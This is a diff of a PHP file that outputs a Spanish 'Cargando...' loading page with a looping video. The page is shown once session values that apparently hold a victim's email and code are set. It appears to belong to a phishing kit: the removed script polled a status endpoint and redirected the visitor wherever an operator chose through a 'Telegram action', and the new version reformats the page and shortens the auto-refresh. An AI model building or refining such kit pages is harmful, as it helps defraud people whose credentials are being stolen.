@@ -52,54 +52,41 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
     echo '<!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>Cargando...</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="2">
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #ffffff;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
-        }
-        .video-container {
-            width: 100%;
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        video {
-            max-width: 60%;
-            max-height: 60vh;
-            object-fit: contain;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta http-equiv="refresh" content="1">
+  <title>Cargando...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    .video-container {
+      width: 100%;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    video {
+      max-width: 60%;
+      max-height: 60vh;
+      object-fit: contain;
+    }
+  </style>
 </head>
 <body>
-    <div class="video-container">
-        <video autoplay loop muted playsinline>
-            <source src="cargaout.MP4" type="video/mp4">
-        </video>
-    </div>
-    <script>
-        // Verificar acción de Telegram cada 2 segundos
-        setInterval(function() {
-            fetch("../check_status.php")
-                .then(response => response.json())
-                .then(data => {
-                    if (data.status === "redirect") {
-                        window.location.href = data.target;
-                    }
-                })
-                .catch(error => console.log("Esperando acción..."));
-        }, 2000);
-    </script>
+  <div class="video-container">
+    <video autoplay loop muted playsinline>
+      <source src="cargaout.MP4" type="video/mp4">
+    </video>
+  </div>
 </body>
 </html>';
     exit;
